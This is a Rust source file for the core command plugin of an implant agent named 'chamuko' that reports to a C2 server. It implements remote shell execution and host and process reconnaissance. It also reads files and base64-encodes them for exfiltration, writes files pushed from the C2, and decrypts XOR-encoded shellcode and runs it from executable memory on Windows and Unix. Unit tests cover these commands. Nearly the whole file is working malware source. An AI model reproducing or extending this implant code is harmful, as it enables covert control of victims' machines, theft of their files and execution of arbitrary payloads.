use std::env;
use std::path::PathBuf;
use std::process::Command;

use base64::Engine;
use chamuko_plugin_api::{CommandOutput, LifecycleEvent, Plugin, PluginError, PluginMetadata, PluginResult};

/// Windows drive-qualified paths (`C:\...`) are absolute but not `is_absolute`
/// when the agent runs on a non-Windows host.
fn is_drive_path(path: &str) -> bool {
    let bytes = path.as_bytes();
    bytes.len() >= 2 && bytes[0].is_ascii_alphabetic() && bytes[1] == b':'
}

fn home_dir() -> &'static str {
    if cfg!(windows) { r"C:\" } else { "/" }
}

pub struct CoreCommands {
    cwd: PathBuf,
}

impl CoreCommands {
    pub fn new() -> Self {
        Self {
            cwd: env::current_dir().unwrap_or_else(|_| PathBuf::from(".")),
        }
    }

    fn run_shell(&self, args: &[String]) -> Result<CommandOutput, PluginError> {
        if args.is_empty() {
            return Ok(CommandOutput::new("usage: exec <command> [args...]"));
        }

        let output = if cfg!(windows) {
            let joined = args.join(" ");
            Command::new("cmd")
                .args(["/C", &joined])
                .current_dir(&self.cwd)
                .output()
                .map_err(|e| format!("failed to spawn: {e}"))?
        } else {
            let program = &args[0];
            let rest = &args[1..];
            Command::new(program)
                .args(rest)
                .current_dir(&self.cwd)
                .output()
                .map_err(|e| format!("failed to spawn: {e}"))?
        };

        let mut stdout = String::from_utf8_lossy(&output.stdout).to_string();
        let stderr = String::from_utf8_lossy(&output.stderr).to_string();
        if !stderr.is_empty() {
            if !stdout.is_empty() {
                stdout.push('\n');
            }
            stdout.push_str(&stderr);
        }
        Ok(CommandOutput {
            stdout,
            exit_code: output.status.code().unwrap_or(-1),
        })
    }

    fn resolve(&self, path: &str) -> PathBuf {
        let candidate = PathBuf::from(path);
        if candidate.is_absolute() || is_drive_path(path) {
            candidate
        } else {
            self.cwd.join(candidate)
        }
    }

    fn change_dir(&mut self, args: &[String]) -> Result<CommandOutput, PluginError> {
        let target = args.first().map(String::as_str).unwrap_or(home_dir());
        let new_path = self.resolve(target);
        if !new_path.is_dir() {
            return Ok(CommandOutput {
                stdout: format!("cd: no such directory: {target}"),
                exit_code: 1,
            });
        }
        self.cwd = new_path;
        Ok(CommandOutput::new(self.cwd.display().to_string()))
    }


    /// Lists running processes. Uses /proc on Linux and tasklist on Windows so
    /// the agent needs no extra crate or elevated rights.
    fn list_processes(&self) -> Result<CommandOutput, PluginError> {
        #[cfg(unix)]
        {
            let mut rows: Vec<(u32, String, String)> = Vec::new();
            let entries = std::fs::read_dir("/proc").map_err(|e| format!("ps: {e}"))?;
            for entry in entries.flatten() {
                let name = entry.file_name();
                let Some(pid) = name.to_str().and_then(|s| s.parse::<u32>().ok()) else {
                    continue;
                };
                let comm = std::fs::read_to_string(entry.path().join("comm"))
                    .map(|s| s.trim().to_string())
                    .unwrap_or_default();
                let cmdline = std::fs::read_to_string(entry.path().join("cmdline"))
                    .map(|s| s.replace('\0', " ").trim().to_string())
                    .unwrap_or_default();
                let label = if cmdline.is_empty() { comm } else { cmdline };
                rows.push((pid, label, String::new()));
            }
            rows.sort_by_key(|(pid, _, _)| *pid);
            let mut out = String::from("PID      COMMAND\n");
            for (pid, label, _) in rows.iter().take(400) {
                let shown: String = label.chars().take(120).collect();
                out.push_str(&format!("{pid:<8} {shown}\n"));
            }
            Ok(CommandOutput::new(out))
        }

        #[cfg(windows)]
        {
            let output = Command::new("tasklist")
                .args(["/FO", "CSV", "/NH"])
                .output()
                .map_err(|e| format!("ps: {e}"))?;
            Ok(CommandOutput {
                stdout: String::from_utf8_lossy(&output.stdout).to_string(),
                exit_code: output.status.code().unwrap_or(-1),
            })
        }
    }

    /// Reads a file from disk and returns it base64-encoded for the C2 to
    /// reassemble. Size is capped so a stray /dev/zero cannot wedge the agent.
    fn read_for_exfil(&self, args: &[String]) -> Result<CommandOutput, PluginError> {
        const MAX_EXFIL: u64 = 64 * 1024 * 1024;
        let target = args
            .first()
            .ok_or("usage: download <path>")?;
        let path = self.resolve(target);
        let meta = std::fs::metadata(&path).map_err(|e| format!("download: {e}"))?;
        if !meta.is_file() {
            return Ok(CommandOutput {
                stdout: format!("download: not a regular file: {}", path.display()),
                exit_code: 1,
            });
        }
        if meta.len() > MAX_EXFIL {
            return Ok(CommandOutput {
                stdout: format!(
                    "download: refusing {} bytes (limit {MAX_EXFIL})",
                    meta.len()
                ),
                exit_code: 1,
            });
        }
        let data = std::fs::read(&path).map_err(|e| format!("download: {e}"))?;
        let encoded = base64::engine::general_purpose::STANDARD.encode(&data);
        Ok(CommandOutput::new(format!(
            "{}|{}|{}",
            path.file_name()
                .map(|n| n.to_string_lossy().to_string())
                .unwrap_or_else(|| "file".to_string()),
            chamuko_protocol::sha256_hex(&data),
            encoded
        )))
    }

    /// Writes a base64 payload received from the C2 to disk.
    fn write_upload(&self, args: &[String]) -> Result<CommandOutput, PluginError> {
        let target = args
            .first()
            .ok_or("usage: upload <path> <base64>")?;
        let encoded = args.get(1).ok_or("usage: upload <path> <base64>")?;
        let data = base64::engine::general_purpose::STANDARD
            .decode(encoded.as_bytes())
            .map_err(|e| format!("upload: bad base64: {e}"))?;
        let path = self.resolve(target);
        if let Some(parent) = path.parent() {
            if !parent.as_os_str().is_empty() {
                std::fs::create_dir_all(parent)
                    .map_err(|e| format!("upload: cannot create dir: {e}"))?;
            }
        }
        std::fs::write(&path, &data).map_err(|e| format!("upload: {e}"))?;
        Ok(CommandOutput::new(format!(
            "wrote {} bytes to {} (sha256={})",
            data.len(),
            path.display(),
            &chamuko_protocol::sha256_hex(&data)[..16]
        )))
    }

    fn run_shellcode(&self, args: &[String]) -> Result<CommandOutput, PluginError> {
        let payload = args
            .first()
            .ok_or("usage: shellcode <encrypted-base64>")?;

        let encrypted = base64::engine::general_purpose::STANDARD
            .decode(payload.as_bytes())
            .map_err(|e| format!("base64 decode failed: {e}"))?;
        let shellcode = chamuko_protocol::xor_transform(
            &encrypted,
            chamuko_protocol::SHELLCODE_XOR_KEY,
        );

        if shellcode.is_empty() {
            return Ok(CommandOutput {
                stdout: "shellcode is empty".to_string(),
                exit_code: 1,
            });
        }

        unsafe {
            #[cfg(windows)]
            {
                use std::ffi::c_void;

                extern "system" {
                    fn VirtualAlloc(
                        lpAddress: *mut c_void,
                        dwSize: usize,
                        flAllocationType: u32,
                        flProtect: u32,
                    ) -> *mut c_void;
                    fn CreateThread(
                        lpThreadAttributes: *mut c_void,
                        dwStackSize: usize,
                        lpStartAddress: Option<unsafe extern "system" fn(*mut c_void) -> u32>,
                        lpParameter: *mut c_void,
                        dwCreationFlags: u32,
                        lpThreadId: *mut u32,
                    ) -> *mut c_void;
                }

                const MEM_COMMIT: u32 = 0x1000;
                const MEM_RESERVE: u32 = 0x2000;
                const PAGE_EXECUTE_READWRITE: u32 = 0x40;

                let ptr = VirtualAlloc(
                    std::ptr::null_mut(),
                    shellcode.len(),
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE,
                );
                if ptr.is_null() {
                    return Ok(CommandOutput {
                        stdout: "VirtualAlloc failed".to_string(),
                        exit_code: 1,
                    });
                }
                std::ptr::copy_nonoverlapping(shellcode.as_ptr(), ptr as *mut u8, shellcode.len());

                let thread_fn: unsafe extern "system" fn(*mut c_void) -> u32 =
                    std::mem::transmute(ptr);
                let handle = CreateThread(
                    std::ptr::null_mut(),
                    0,
                    Some(thread_fn),
                    std::ptr::null_mut(),
                    0,
                    std::ptr::null_mut(),
                );
                if handle.is_null() {
                    return Ok(CommandOutput {
                        stdout: "CreateThread failed".to_string(),
                        exit_code: 1,
                    });
                }
            }

            #[cfg(unix)]
            {
                let ptr = libc::mmap(
                    std::ptr::null_mut(),
                    shellcode.len().max(1),
                    libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC,
                    libc::MAP_PRIVATE | libc::MAP_ANONYMOUS,
                    -1,
                    0,
                );
                if ptr == libc::MAP_FAILED {
                    return Ok(CommandOutput {
                        stdout: "mmap failed".to_string(),
                        exit_code: 1,
                    });
                }
                std::ptr::copy_nonoverlapping(shellcode.as_ptr(), ptr as *mut u8, shellcode.len());

                let func: extern "C" fn() = std::mem::transmute(ptr);
                std::thread::spawn(move || {
                    func();
                });
            }
        }

        Ok(CommandOutput::new(format!(
            "shellcode loaded and executing ({} bytes)",
            shellcode.len()
        )))
    }
}

impl Default for CoreCommands {
    fn default() -> Self {
        Self::new()
    }
}

impl Plugin for CoreCommands {
    fn metadata(&self) -> PluginMetadata {
        PluginMetadata {
            id: "core",
            version: "0.1.0",
        }
    }

    fn on_event(&mut self, _event: LifecycleEvent) -> PluginResult {
        Ok(())
    }

    fn supports(&self, command: &str) -> bool {
        matches!(
            command,
            "exec"
                | "info"
                | "whoami"
                | "hostname"
                | "pwd"
                | "ls"
                | "cd"
                | "shellcode"
                | "ps"
                | "download"
                | "upload"
                | "help"
        )
    }

    fn supported_commands(&self) -> Vec<&'static str> {
        vec![
            "exec", "info", "whoami", "hostname", "pwd", "ls", "cd", "shellcode", "ps", "download",
            "upload", "help",
        ]
    }

    fn execute(
        &mut self,
        command: &str,
        args: &[String],
    ) -> Result<CommandOutput, PluginError> {
        match command {
            "exec" => self.run_shell(args),
            "info" => {
                let info = chamuko_protocol::AgentInfo::local(String::new());
                let text = format!(
                    "host: {}\nuser: {}\nos:   {} {}\npid:  {}",
                    info.hostname, info.username, info.os, info.arch, info.pid
                );
                Ok(CommandOutput::new(text))
            }
            "whoami" => Ok(CommandOutput::new(
                env::var("USER")
                    .or_else(|_| env::var("USERNAME"))
                    .unwrap_or_else(|_| "unknown".to_string()),
            )),
            "hostname" => Ok(CommandOutput::new(
                env::var("HOSTNAME")
                    .or_else(|_| env::var("COMPUTERNAME"))
                    .unwrap_or_else(|_| "unknown".to_string()),
            )),
            "pwd" => Ok(CommandOutput::new(self.cwd.display().to_string())),
            "ls" => {
                let dir = match args.first() {
                    Some(arg) => self.resolve(arg),
                    None => self.cwd.clone(),
                };
                if dir.is_file() {
                    return Ok(CommandOutput::new(
                        dir.file_name()
                            .map(|n| n.to_string_lossy().to_string())
                            .unwrap_or_else(|| dir.display().to_string()),
                    ));
                }
                let entries = std::fs::read_dir(&dir).map_err(|e| format!("ls: {e}"))?;
                let mut names: Vec<String> = entries
                    .filter_map(|e| e.ok().map(|e| e.file_name().to_string_lossy().to_string()))
                    .collect();
                names.sort();
                Ok(CommandOutput::new(names.join("\n")))
            }
            "cd" => self.change_dir(args),
            "shellcode" => self.run_shellcode(args),
            "ps" => self.list_processes(),
            "download" => self.read_for_exfil(args),
            "upload" => self.write_upload(args),
            "help" => Ok(CommandOutput::new(
                "commands:\n  exec <cmd> [args...]  run a shell command\n  info                 show host info\n  whoami               current user\n  hostname             host name\n  pwd                  current directory\n  ls [dir]             list directory\n  cd <dir>             change directory\n  shellcode <b64>      load and execute encrypted shellcode in memory\n  ps                   list running processes\n  download <path>      read a file and return it to the C2\n  upload <path> <b64>  write a file received from the C2\n  help                 show this help",
            )),
            _ => Err(format!("unknown command: {command}").into()),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tmpdir(tag: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("chamuko-test-{tag}-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    #[test]
    fn resolve_joins_relative_paths_onto_cwd() {
        let mut core = CoreCommands::new();
        let dir = tmpdir("resolve");
        core.cwd = dir.clone();
        assert_eq!(core.resolve("sub"), dir.join("sub"));
        assert_eq!(core.resolve("/etc"), PathBuf::from("/etc"));
        assert_eq!(core.resolve(r"C:\Windows"), PathBuf::from(r"C:\Windows"));
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn cd_moves_into_relative_directory_and_reports_it() {
        let dir = tmpdir("cd");
        std::fs::create_dir_all(dir.join("inner")).unwrap();
        let mut core = CoreCommands::new();
        core.cwd = dir.clone();

        let out = core.change_dir(&["inner".to_string()]).unwrap();
        assert_eq!(out.exit_code, 0);
        assert_eq!(core.cwd, dir.join("inner"));

        let out = core.change_dir(&["missing".to_string()]).unwrap();
        assert_eq!(out.exit_code, 1);
        assert_eq!(core.cwd, dir.join("inner"));
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn ls_resolves_relative_paths_against_cwd() {
        let dir = tmpdir("ls");
        std::fs::write(dir.join("archivo.txt"), b"hi").unwrap();
        let mut core = CoreCommands::new();
        core.cwd = dir.clone();

        let out = core.execute("ls", &[]).unwrap();
        assert_eq!(out.stdout, "archivo.txt");

        let out = core.execute("ls", &["archivo.txt".to_string()]).unwrap();
        assert_eq!(out.exit_code, 0);
        assert_eq!(out.stdout, "archivo.txt");
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn exec_runs_commands_in_tracked_cwd() {
        let dir = tmpdir("exec");
        let mut core = CoreCommands::new();
        core.cwd = dir.clone();

        let out = core.execute("exec", &["pwd".to_string()]).unwrap();
        assert_eq!(out.stdout.trim(), dir.display().to_string());
        std::fs::remove_dir_all(&dir).ok();
    }


    #[test]
    fn ps_lists_at_least_the_current_process() {
        let mut core = CoreCommands::new();
        let out = core.execute("ps", &[]).unwrap();
        assert_eq!(out.exit_code, 0);
        assert!(out.stdout.contains("PID"));
        #[cfg(unix)]
        assert!(
            out.stdout.contains(&std::process::id().to_string()),
            "own pid missing from ps output"
        );
    }

    #[test]
    fn download_returns_name_hash_and_payload() {
        let dir = tmpdir("download");
        let file = dir.join("nota.txt");
        std::fs::write(&file, b"contenido").unwrap();
        let mut core = CoreCommands::new();
        core.cwd = dir.clone();

        let out = core.execute("download", &["nota.txt".to_string()]).unwrap();
        assert_eq!(out.exit_code, 0);
        let mut parts = out.stdout.splitn(3, '|');
        assert_eq!(parts.next().unwrap(), "nota.txt");
        assert_eq!(parts.next().unwrap(), chamuko_protocol::sha256_hex(b"contenido"));
        let encoded = parts.next().unwrap();
        use base64::Engine;
        let decoded = base64::engine::general_purpose::STANDARD.decode(encoded).unwrap();
        assert_eq!(decoded, b"contenido");
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn download_refuses_directories() {
        let dir = tmpdir("download-dir");
        let mut core = CoreCommands::new();
        core.cwd = dir.clone();
        let out = core.execute("download", &[".".to_string()]).unwrap();
        assert_eq!(out.exit_code, 1);
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn upload_writes_the_decoded_payload() {
        let dir = tmpdir("upload");
        let mut core = CoreCommands::new();
        core.cwd = dir.clone();

        use base64::Engine;
        let encoded = base64::engine::general_purpose::STANDARD.encode(b"payload-bytes");
        let out = core
            .execute(
                "upload",
                &["out.bin".to_string(), encoded],
            )
            .unwrap();
        assert_eq!(out.exit_code, 0);
        assert_eq!(std::fs::read(dir.join("out.bin")).unwrap(), b"payload-bytes");
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn upload_creates_missing_parent_directories() {
        let dir = tmpdir("upload-nested");
        let mut core = CoreCommands::new();
        core.cwd = dir.clone();

        use base64::Engine;
        let encoded = base64::engine::general_purpose::STANDARD.encode(b"x");
        core.execute("upload", &["a/b/c.bin".to_string(), encoded])
            .unwrap();
        assert!(dir.join("a/b/c.bin").is_file());
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn new_commands_are_advertised() {
        let core = CoreCommands::new();
        let advertised = core.supported_commands();
        for expected in ["ps", "download", "upload"] {
            assert!(advertised.contains(&expected), "missing {expected}");
            assert!(core.supports(expected));
        }
    }

    #[test]
    fn unknown_commands_are_rejected() {
        let mut core = CoreCommands::new();
        assert!(core.execute("nope", &[]).is_err());
    }
}
